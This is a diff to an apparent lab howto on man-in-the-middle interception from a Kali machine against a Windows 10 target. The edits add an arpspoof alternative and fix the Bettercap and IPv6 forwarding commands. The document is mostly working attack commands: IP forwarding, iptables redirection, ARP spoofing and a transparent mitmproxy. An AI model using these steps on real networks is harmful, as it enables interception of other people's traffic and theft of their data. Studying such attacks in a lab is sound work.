@@ -22,19 +22,22 @@ $ sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to
 We accept ip forwarding on ipv4 and ipv6.
 $ sudo sh
 # echo "1" > /proc/sys/net/ipv4/ip_forward
-# echo "1" > /proc/sys/net/ipv6/ip_forward
+# echo "1" > /proc/sys/net/ipv6/conf/all/forwarding
 
 We avoid automatic ICP redirection.
 # echo "0" > /proc/sys/net/ipv4/conf/all/send_redirects
 
-2. Use Bettercap to set up the ARP spoofing.
+2a. Use Bettercap to set up the ARP spoofing.
 $ sudo bettercap
-IP > IP » set arp.spoof.target <win10 IP>
+IP > IP » set arp.spoof.targets <win10 IP>
 IP > IP » set arp.spoof.fullduplex true
 IP > IP » arp.spoof on
 
-3 Use MITMProxy to launch the transparent HTTP proxy.
-$ sudo mitmproxy --mode transparent --listen-host <ip de kali> [--listen-port <port>]
+2b. Use arpspoof to set up the ARP spoofing
+$ sudo arpspoof -i eth0 -t <target IP addr> -r <gw IP addr>
+
+3. Use MITMProxy to launch the transparent HTTP proxy (by default, the port of mimtproxy is 8080).
+$ sudo mitmproxy --mode transparent --listen-host <Kali IP> [--listen-port <port>]
 
 Go to the win10 machine and in a browser load example.com.
 
@@ -66,6 +69,7 @@ In the win10 machine, execute the reload of example.com
 >@# modify them before they reach their destination, and replay them to a client or server later on.   #
 >@#                                                                                                    #
 >@# See: https://mitmproxy.org/                                                                        #
+>@# See: howto-0032-arpspoof-arp-spoofing.txt                                                          #
 >@# See: howto-0033-bettercap.txt                                                                      #
 >@#                                                                                                    #
 >@#----------------------------------------------------------------------------------------------------#
@@ -90,13 +94,16 @@ In the win10 machine, execute the reload of example.com
 >@We avoid automatic ICP redirection.
 >@# echo "0" > /proc/sys/net/ipv4/conf/all/send_redirects
 >@
->@2. Use Bettercap to set up the ARP spoofing.
+>@2a. Use Bettercap to set up the ARP spoofing.
 >@$ sudo bettercap
 >@IP > IP » set arp.spoof.target <win10 IP>
 >@IP > IP » set arp.spoof.fullduplex true
 >@IP > IP » arp.spoof on
 >@
->@3 Use MITMProxy to launch the transparent HTTP proxy.
+>@2b. Use arpspoof to set up the ARP spoofing
+>@$ sudo arpspoof -i eth0 -t <target IP addr> -r <gw IP addr>
+>@
+>@3. Use MITMProxy to launch the transparent HTTP proxy (by default, the port of mimtproxy is 8080).
 >@$ sudo mitmproxy --mode transparent --listen-host <ip de kali> [--listen-port <port>]
 >@
 >@Go to the win10 machine and in a browser load example.com.
